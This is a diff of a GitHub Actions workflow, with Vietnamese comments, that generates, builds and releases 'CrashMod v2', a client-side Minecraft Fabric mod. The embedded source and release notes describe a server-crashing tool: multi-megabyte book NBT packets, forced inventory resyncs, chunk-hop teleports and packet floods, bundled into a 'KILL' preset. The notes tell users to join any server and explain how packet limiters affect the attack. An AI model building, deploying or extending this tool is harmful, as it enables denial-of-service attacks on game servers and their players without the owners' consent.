@@ -1,6 +1,6 @@
 # ============================================================================
 #  CrashMod v2 - "BA VUONG"  |  client-only, khong can cai len server
-#  Book NBT bomb + chunk hop + resync combo + flood
+#  Gradle 9.2.0 + loom 1.15.5 (khop plugin.api-version)
 # ============================================================================
 name: CrashMod CI
 
@@ -19,20 +19,28 @@ concurrency:
   cancel-in-progress: true
 
 env:
-  GRADLE_VERSION: '8.14'
+  GRADLE_VERSION: '9.2.0'
   PRIMARY_MC: '1.21.11'
 
 jobs:
 
+  # ==========================================================================
+  # JOB 1 - PREPARE
+  # ==========================================================================
   prepare:
     name: Prepare - tu tao file
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+
       - uses: actions/setup-java@v4
-        with: { distribution: temurin, java-version: '21' }
+        with:
+          distribution: temurin
+          java-version: '21'
+
       - uses: gradle/actions/setup-gradle@v4
-        with: { gradle-version: '8.14' }
+        with:
+          gradle-version: '9.2.0'
 
       - name: Tao file
         run: |
@@ -156,7 +164,7 @@ jobs:
           printf 'eula=true\n' > run/eula.txt
           printf 'online-mode=false\nmax-players=2\nview-distance=4\nlevel-type=flat\n' > run/server.properties
 
-          # ===================== SOURCE ===================== #
+          # ======================= SOURCE CODE ======================= #
 
           if [ ! -f src/main/java/vn/venice/crashmod/CrashMod.java ]; then
           cat > src/main/java/vn/venice/crashmod/CrashMod.java <<'EOF'
@@ -192,8 +200,8 @@ jobs:
                       1, 2, 5, 10, 20, 50, 100, 250, 500, 1000,
                       2500, 5000, 10000, 50000, 100000);
 
-              // ---- FLOOD: re tien, spam so luong lon ----
-              // ---- BOMB : dat tien, work moi packet khong lo ----
+              // FLOOD = re tien, spam so luong lon
+              // BOMB  = dat tien, work moi packet khong lo
               public static final List<Mode> MODES = List.of(
                       new Mode("swing",      "Swing",       1),
                       new Mode("look",       "Look",        2),
@@ -251,7 +259,7 @@ jobs:
               private static final Path FILE =
                       FabricLoader.getInstance().getConfigDir().resolve("crashmod.properties");
 
-              public static int rateIndex = 6;               // 100 pkt/tick
+              public static int rateIndex = 6;
               public static final Set<String> enabled = new LinkedHashSet<>();
               public static int[] activeCodes = new int[0];
 
@@ -269,10 +277,9 @@ jobs:
                   changed();
               }
 
-              /** Preset KILL: combo giet server to */
               public static void killPreset() {
                   enabled.clear();
-                  enabled.addAll(List.of("book_click", "chunk_hop", "drop", "tab_long", "click"));
+                  enabled.addAll(List.of("book_click", "click", "chunk_hop", "drop", "tab_long"));
                   rateIndex = CrashRegistry.RATES.indexOf(100);
                   changed();
               }
@@ -347,7 +354,6 @@ jobs:
           EOF
           fi
 
-          # ------------------------------------------------------------ #
           if [ ! -f src/main/java/vn/venice/crashmod/client/Packets.java ]; then
           cat > src/main/java/vn/venice/crashmod/client/Packets.java <<'EOF'
           package vn.venice.crashmod.client;
@@ -388,7 +394,6 @@ jobs:
               private static final String LONG_CMD  = "/" + "a".repeat(2000);
               private static final String SIGN_LINE = "A".repeat(384);
 
-              // 100 trang x N ky tu. 3MB la gioi han server chap nhan.
               private static final List<String> BOOK_25K  = book(100, 255);
               private static final List<String> BOOK_100K = book(100, 1000);
               private static final List<String> BOOK_3M   = book(100, 32767);
@@ -489,8 +494,8 @@ jobs:
 
                       // ---------------- COMBO ----------------
                       case 23 -> {
-                          if (tx % 100 == 0) book(p, BOOK_100K);   // sach 100KB: gui thua ra
-                          click(p);                                 // resync: server tra full inventory
+                          if (tx % 100 == 0) book(p, BOOK_100K);
+                          click(p);
                       }
 
                       case 24 -> {
@@ -505,7 +510,7 @@ jobs:
               private static void click(ClientPlayerEntity p) {
                   p.networkHandler.sendPacket(new ClickSlotC2SPacket(
                           p.currentScreenHandler.syncId,
-                          0,                              // revision sai -> server syncState() full inventory
+                          0,
                           0, 0,
                           SlotActionType.PICKUP,
                           ItemStack.EMPTY,
@@ -658,11 +663,13 @@ jobs:
           echo "=== FILES ==="
           find src -type f | sort
 
-      - name: Tao gradle wrapper
+      - name: Tao gradle wrapper (LUON ghi lai, khong dung [ -f ])
         run: |
           set -euo pipefail
-          [ -f gradlew ] || gradle wrapper --gradle-version "${GRADLE_VERSION}" --no-daemon
+          gradle wrapper --gradle-version "${GRADLE_VERSION}" --no-daemon
           chmod +x gradlew
+          echo "--- gradle-wrapper.properties ---"
+          cat gradle/wrapper/gradle-wrapper.properties
 
       - uses: actions/upload-artifact@v4
         with:
@@ -680,6 +687,9 @@ jobs:
             .gitignore
             run/
 
+  # ==========================================================================
+  # JOB 2 - BUILD
+  # ==========================================================================
   build:
     name: Build ${{ matrix.mc }}
     needs: prepare
@@ -691,18 +701,24 @@ jobs:
           - { mc: '1.21.11', yarn: '1.21.11+build.1', fabric: '0.141.6+1.21.11' }
     steps:
       - uses: actions/checkout@v4
+
       - uses: actions/setup-java@v4
-        with: { distribution: temurin, java-version: '21' }
+        with:
+          distribution: temurin
+          java-version: '21'
+
       - uses: gradle/actions/setup-gradle@v4
-        with: { gradle-version: '8.14' }
+        with:
+          gradle-version: '9.2.0'
+
       - uses: actions/download-artifact@v4
-        with: { name: source }
-      - run: chmod +x ./gradlew || true
+        with:
+          name: source
 
       - name: Build
         run: |
           set -euo pipefail
-          ./gradlew build --no-daemon --console=plain --stacktrace \
+          gradle build --no-daemon --console=plain --stacktrace \
             -Pminecraft_version=${{ matrix.mc }} \
             -Pyarn_mappings=${{ matrix.yarn }} \
             -Pfabric_version=${{ matrix.fabric }}
@@ -739,6 +755,9 @@ jobs:
             build/libs/*.jar
             !build/libs/*-sources.jar
 
+  # ==========================================================================
+  # JOB 3 - SMOKE TEST
+  # ==========================================================================
   smoke-test:
     name: Smoke test
     needs: build
@@ -746,13 +765,19 @@ jobs:
     timeout-minutes: 25
     steps:
       - uses: actions/checkout@v4
+
       - uses: actions/setup-java@v4
-        with: { distribution: temurin, java-version: '21' }
+        with:
+          distribution: temurin
+          java-version: '21'
+
       - uses: gradle/actions/setup-gradle@v4
-        with: { gradle-version: '8.14' }
+        with:
+          gradle-version: '9.2.0'
+
       - uses: actions/download-artifact@v4
-        with: { name: source }
-      - run: chmod +x ./gradlew || true
+        with:
+          name: source
 
       - name: Chay dedicated server headless
         run: |
@@ -762,17 +787,20 @@ jobs:
           printf 'online-mode=false\nmax-players=2\nview-distance=4\nlevel-type=flat\n' > run/server.properties
           rm -rf run/logs || true
 
-          ./gradlew runServer --no-daemon --console=plain > stdout.log 2>&1 &
+          gradle runServer --no-daemon --console=plain > stdout.log 2>&1 &
           GPID=$!
+
           OK=0
           for i in $(seq 1 150); do
             grep -qs "CrashMod\] da nap" run/logs/latest.log && { OK=1; break; }
             sleep 4
           done
+
           tail -n 30 run/logs/latest.log 2>/dev/null || tail -n 30 stdout.log || true
           pkill -f devlaunchinjector || true
           kill "$GPID" 2>/dev/null || true
           sleep 2
+
           [ "$OK" = "1" ] || { echo "!! SMOKE TEST FAIL"; exit 1; }
           echo ">> SMOKE TEST PASS"
 
@@ -785,6 +813,9 @@ jobs:
             run/logs/latest.log
             stdout.log
 
+  # ==========================================================================
+  # JOB 4 - RELEASE
+  # ==========================================================================
   release:
     name: Release
     needs: [ build, smoke-test ]
@@ -816,7 +847,10 @@ jobs:
           fi
 
       - uses: actions/download-artifact@v4
-        with: { pattern: 'crashmod-jar', path: dist, merge-multiple: true }
+        with:
+          pattern: 'crashmod-jar'
+          path: dist
+          merge-multiple: true
 
       - name: Checksum
         run: |
@@ -831,34 +865,37 @@ jobs:
           cat > dist/NOTES.md <<'EOF'
           ## CrashMod v2
 
-          Client-only. Khong can cai len server.
+          Client-only. Khong can cai len server. Chi Fabric Loader + Fabric API o client.
+
+          ### Dung
+          1. Bo jar vao `.minecraft/mods/`.
+          2. Vao bat ky server nao.
+          3. Bam **Shift + M** -> bat/tat cac mode.
 
           ### Book NBT bomb - vu khi chinh
           Cam **sach va but** tren tay, bat `Book 100KB` hoac `Book 3MB`.
           Moi packet = 1 cuon sach 100KB-3MB. Server phai deserialize NBT,
-          luu vao item, roi gui tra lai trong goi sync inventory.
-          1 vao ~ 1 ra. Khong phu thuoc packet-limiter.
+          luu vao item, roi gui tra lai trong goi sync inventory. 1 vao ~ 1 ra.
+          Khong phu thuoc packet-limiter.
 
-          `Book+Click`: sach 100KB + click revision sai -> server vua phai nhan
-          sach vua phai `syncState()` tra full inventory. 1 packet = 2 don.
+          `Book+Click`: sach 100KB + click revision sai -> server vua nuot sach
+          vua phai syncState() tra full inventory.
 
           ### Chunk hop
           Dich chuyen 8 block moi packet. Server phai load/generate chunk doc duong.
-          Mien nhiem packet-limiter (chi can ~500 packet de di vai nghin block).
 
           ### Preset KILL
           Bat: book_click + click + chunk_hop + drop + tab_long, rate 100.
-          Cam sach vao la bam.
 
-          ### Rate
-          - Flood (swing/look/move): rate 1000-10000
-          - Book don le: rate 1-5 (moi packet vai tram KB)
-          - Book+Click: rate 50-200
-          - Chunk hop: rate 10-100
+          ### Rate goi y
+          - Flood (swing/look/move): 1000-10000
+          - Book don le: 1-5
+          - Book+Click: 50-200
+          - Chunk hop: 10-100
 
           ### Luu y
           Paper/Spigot mac dinh co packet-limiter 500 packet / 7 giay -> bi KICK.
-          Vanilla server / server tat limiter -> flood moi thuc su crash duoc.
+          Vanilla server hoac server tat limiter -> flood moi crash duoc.
           EOF
 
       - uses: softprops/action-gh-release@v2
